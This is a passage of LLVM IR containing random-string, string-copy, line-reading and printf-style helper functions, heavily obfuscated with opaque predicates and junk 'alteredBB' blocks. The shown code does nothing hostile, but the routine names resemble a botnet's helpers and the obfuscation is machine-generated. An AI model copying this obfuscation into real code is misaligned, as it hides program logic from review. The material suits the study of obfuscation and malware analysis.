  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %originalBBpart217, %2
  %6 = load i32, i32* @x.17
  %7 = load i32, i32* @y.18
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = load i32, i32* %4, align 4
  %15 = icmp sgt i32 %14, 0
  %16 = load i32, i32* @x.17
  %17 = load i32, i32* @y.18
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %110

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 4
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %24
  %28 = load i32, i32* @x.17
  %29 = load i32, i32* @y.18
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %27
  %36 = call i32 @rand_next()
  %37 = load i8*, i8** %3, align 8
  %38 = bitcast i8* %37 to i32*
  store i32 %36, i32* %38, align 4
  %39 = load i8*, i8** %3, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 4
  store i8* %40, i8** %3, align 8
  %41 = load i32, i32* %4, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 %42, 4
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* @x.17
  %46 = load i32, i32* @y.18
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %93

; <label>:53:                                     ; preds = %24
  %54 = load i32, i32* %4, align 4
  %55 = icmp sge i32 %54, 2
  br i1 %55, label %56, label %68

; <label>:56:                                     ; preds = %53
  %57 = call i32 @rand_next()
  %58 = and i32 %57, 65535
  %59 = trunc i32 %58 to i16
  %60 = load i8*, i8** %3, align 8
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = load i8*, i8** %3, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 2
  store i8* %63, i8** %3, align 8
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = sub i64 %65, 2
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %4, align 4
  br label %76

; <label>:68:                                     ; preds = %53
  %69 = call i32 @rand_next()
  %70 = and i32 %69, 255
  %71 = trunc i32 %70 to i8
  %72 = load i8*, i8** %3, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %3, align 8
  store i8 %71, i8* %72, align 1
  %74 = load i32, i32* %4, align 4
  %75 = add nsw i32 %74, -1
  store i32 %75, i32* %4, align 4
  br label %76

; <label>:76:                                     ; preds = %68, %56
  %77 = load i32, i32* @x.17
  %78 = load i32, i32* @y.18
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %76
  %85 = load i32, i32* @x.17
  %86 = load i32, i32* @y.18
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %93

; <label>:93:                                     ; preds = %originalBBpart213, %originalBBpart29
  %94 = load i32, i32* @x.17
  %95 = load i32, i32* @y.18
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %93
  %102 = load i32, i32* @x.17
  %103 = load i32, i32* @y.18
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %5

; <label>:110:                                    ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %111 = load i32, i32* %4, align 4
  %112 = icmp sgt i32 %111, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %27
  %113 = call i32 @rand_next()
  %114 = load i8*, i8** %3, align 8
  %115 = bitcast i8* %114 to i32*
  store i32 %113, i32* %115, align 4
  %116 = load i8*, i8** %3, align 8
  %117 = getelementptr inbounds i8, i8* %116, i64 4
  store i8* %117, i8** %3, align 8
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %_ = sub i64 %119, 4
  %gen = mul i64 %_, 4
  %_2 = sub i64 0, %119
  %gen3 = add i64 %_2, 4
  %_4 = shl i64 %119, 4
  %_5 = sub i64 %119, 4
  %gen6 = mul i64 %_5, 4
  %_7 = shl i64 %119, 4
  %120 = sub i64 %119, 4
  %121 = trunc i64 %120 to i32
  store i32 %121, i32* %4, align 4
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %76
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %93
  br label %originalBB15
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %originalBBpart236, %2
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  br i1 %10, label %11, label %119

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = icmp uge i64 %13, 4
  br i1 %14, label %15, label %93

; <label>:15:                                     ; preds = %11
  %16 = call i32 @rand_next()
  store i32 %16, i32* %6, align 4
  store i32 0, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %originalBBpart232, %15
  %18 = load i32, i32* @x.19
  %19 = load i32, i32* @y.20
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = icmp ult i64 %27, 4
  %29 = load i32, i32* @x.19
  %30 = load i32, i32* @y.20
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %88

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* @x.19
  %39 = load i32, i32* @y.20
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %6, align 4
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %7, align 1
  %49 = load i32, i32* %6, align 4
  %50 = lshr i32 %49, 8
  store i32 %50, i32* %6, align 4
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i32
  %53 = ashr i32 %52, 3
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %7, align 1
  %55 = load i8, i8* %7, align 1
  %56 = zext i8 %55 to i64
  %57 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load i8*, i8** %3, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %3, align 8
  store i8 %58, i8* %59, align 1
  %61 = load i32, i32* @x.19
  %62 = load i32, i32* @y.20
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart221, label %originalBB1alteredBB

originalBBpart221:                                ; preds = %originalBB1
  br label %69

; <label>:69:                                     ; preds = %originalBBpart221
  %70 = load i32, i32* @x.19
  %71 = load i32, i32* @y.20
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %69
  %78 = load i32, i32* %5, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %5, align 4
  %80 = load i32, i32* @x.19
  %81 = load i32, i32* @y.20
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart232, label %originalBB23alteredBB

originalBBpart232:                                ; preds = %originalBB23
  br label %17

; <label>:88:                                     ; preds = %originalBBpart2
  %89 = load i32, i32* %4, align 4
  %90 = sext i32 %89 to i64
  %91 = sub i64 %90, 4
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* %4, align 4
  br label %102

; <label>:93:                                     ; preds = %11
  %94 = call i32 @rand_next()
  %95 = zext i32 %94 to i64
  %96 = urem i64 %95, 32
  %97 = trunc i64 %96 to i8
  %98 = load i8*, i8** %3, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %3, align 8
  store i8 %97, i8* %98, align 1
  %100 = load i32, i32* %4, align 4
  %101 = add nsw i32 %100, -1
  store i32 %101, i32* %4, align 4
  br label %102

; <label>:102:                                    ; preds = %93, %88
  %103 = load i32, i32* @x.19
  %104 = load i32, i32* @y.20
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %102
  %111 = load i32, i32* @x.19
  %112 = load i32, i32* @y.20
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %8

; <label>:119:                                    ; preds = %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %17
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = icmp ult i64 %121, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %123 = load i32, i32* %6, align 4
  %_ = sub i32 %123, 255
  %gen = mul i32 %_, 255
  %_2 = sub i32 %123, 255
  %gen3 = mul i32 %_2, 255
  %_4 = sub i32 0, %123
  %gen5 = add i32 %_4, 255
  %_6 = sub i32 0, %123
  %gen7 = add i32 %_6, 255
  %_8 = shl i32 %123, 255
  %_9 = shl i32 %123, 255
  %_10 = sub i32 0, %123
  %gen11 = add i32 %_10, 255
  %124 = and i32 %123, 255
  %125 = trunc i32 %124 to i8
  store i8 %125, i8* %7, align 1
  %126 = load i32, i32* %6, align 4
  %_12 = sub i32 %126, 8
  %gen13 = mul i32 %_12, 8
  %_14 = sub i32 %126, 8
  %gen15 = mul i32 %_14, 8
  %_16 = shl i32 %126, 8
  %_17 = shl i32 %126, 8
  %127 = lshr i32 %126, 8
  store i32 %127, i32* %6, align 4
  %128 = load i8, i8* %7, align 1
  %129 = zext i8 %128 to i32
  %_18 = shl i32 %129, 3
  %_19 = shl i32 %129, 3
  %130 = ashr i32 %129, 3
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %7, align 1
  %132 = load i8, i8* %7, align 1
  %133 = zext i8 %132 to i64
  %134 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %133
  %135 = load i8, i8* %134, align 1
  %136 = load i8*, i8** %3, align 8
  %137 = getelementptr inbounds i8, i8* %136, i32 1
  store i8* %137, i8** %3, align 8
  store i8 %135, i8* %136, align 1
  br label %originalBB1

originalBB23alteredBB:                            ; preds = %originalBB23, %69
  %138 = load i32, i32* %5, align 4
  %_24 = shl i32 %138, 1
  %_25 = sub i32 0, %138
  %gen26 = add i32 %_25, 1
  %_27 = sub i32 0, %138
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 %138, 1
  %gen30 = mul i32 %_29, 1
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %5, align 4
  br label %originalBB23

originalBB34alteredBB:                            ; preds = %originalBB34, %102
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %originalBBpart2, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* @x.21
  %12 = load i32, i32* @y.22
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %3, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* @x.21
  %22 = load i32, i32* @y.22
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %4

; <label>:29:                                     ; preds = %4
  %30 = load i32, i32* %3, align 4
  ret i32 %30

originalBBalteredBB:                              ; preds = %originalBB, %10
  %31 = load i32, i32* %3, align 4
  %_ = sub i32 0, %31
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %31
  %gen2 = add i32 %_1, 1
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %31, %3
  %12 = load i32, i32* @x.23
  %13 = load i32, i32* @y.24
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = add nsw i32 %20, -1
  store i32 %21, i32* %6, align 4
  %22 = icmp ne i32 %20, 0
  %23 = load i32, i32* @x.23
  %24 = load i32, i32* @y.24
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %37

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i8*, i8** %8, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %8, align 8
  %34 = load i8, i8* %32, align 1
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %7, align 8
  store i8 %34, i8* %35, align 1
  br label %11

; <label>:37:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %11
  %38 = load i32, i32* %6, align 4
  %_ = shl i32 %38, -1
  %_1 = shl i32 %38, -1
  %_2 = shl i32 %38, -1
  %_3 = shl i32 %38, -1
  %_4 = sub i32 %38, -1
  %gen = mul i32 %_4, -1
  %_5 = sub i32 %38, -1
  %gen6 = mul i32 %_5, -1
  %_7 = sub i32 %38, -1
  %gen8 = mul i32 %_7, -1
  %39 = add nsw i32 %38, -1
  store i32 %39, i32* %6, align 4
  %40 = icmp ne i32 %38, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %75, %3
  %10 = load i32, i32* @x.27
  %11 = load i32, i32* @y.28
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i32, i32* %7, align 4
  %19 = icmp eq i32 %18, 1
  %20 = load i32, i32* @x.27
  %21 = load i32, i32* @y.28
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %73

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32, i32* @x.27
  %30 = load i32, i32* @y.28
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %37 = load i32, i32* %8, align 4
  %38 = load i32, i32* %5, align 4
  %39 = icmp slt i32 %37, %38
  %40 = load i32, i32* @x.27
  %41 = load i32, i32* @y.28
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %39, label %48, label %73

; <label>:48:                                     ; preds = %originalBBpart24
  %49 = load i32, i32* @x.27
  %50 = load i32, i32* @y.28
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %48
  %57 = load i8*, i8** %4, align 8
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = getelementptr inbounds i8, i8* %60, i64 -1
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 10
  %65 = load i32, i32* @x.27
  %66 = load i32, i32* @y.28
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %73

; <label>:73:                                     ; preds = %originalBBpart28, %originalBBpart24, %originalBBpart2
  %74 = phi i1 [ false, %originalBBpart24 ], [ false, %originalBBpart2 ], [ %64, %originalBBpart28 ]
  br i1 %74, label %75, label %85

; <label>:75:                                     ; preds = %73
  %76 = load i32, i32* %6, align 4
  %77 = load i8*, i8** %4, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = call i64 @read(i32 %76, i8* %80, i64 1)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %7, align 4
  %83 = load i32, i32* %8, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %8, align 4
  br label %9

; <label>:85:                                     ; preds = %73
  %86 = load i32, i32* %7, align 4
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %85
  br label %91

; <label>:89:                                     ; preds = %85
  %90 = load i8*, i8** %4, align 8
  br label %91

; <label>:91:                                     ; preds = %89, %88
  %92 = phi i8* [ null, %88 ], [ %90, %89 ]
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %9
  %93 = load i32, i32* %7, align 4
  %94 = icmp eq i32 %93, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  %95 = load i32, i32* %8, align 4
  %96 = load i32, i32* %5, align 4
  %97 = icmp slt i32 %95, %96
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %48
  %98 = load i8*, i8** %4, align 8
  %99 = load i32, i32* %8, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %98, i64 %100
  %102 = getelementptr inbounds i8, i8* %101, i64 -1
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp ne i32 %104, 10
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %522, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %525

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %481

; <label>:22:                                     ; preds = %17
  %23 = load i32, i32* @x.31
  %24 = load i32, i32* @y.32
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %33 = load i8*, i8** %5, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  %37 = load i32, i32* @x.31
  %38 = load i32, i32* @y.32
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %46

; <label>:45:                                     ; preds = %originalBBpart2
  br label %525

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %498

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 45
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %5, align 8
  %59 = getelementptr inbounds i8, i8* %58, i32 1
  store i8* %59, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %60

; <label>:60:                                     ; preds = %57, %52
  %61 = load i32, i32* @x.31
  %62 = load i32, i32* @y.32
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* @x.31
  %70 = load i32, i32* @y.32
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %82, %originalBBpart24
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 48
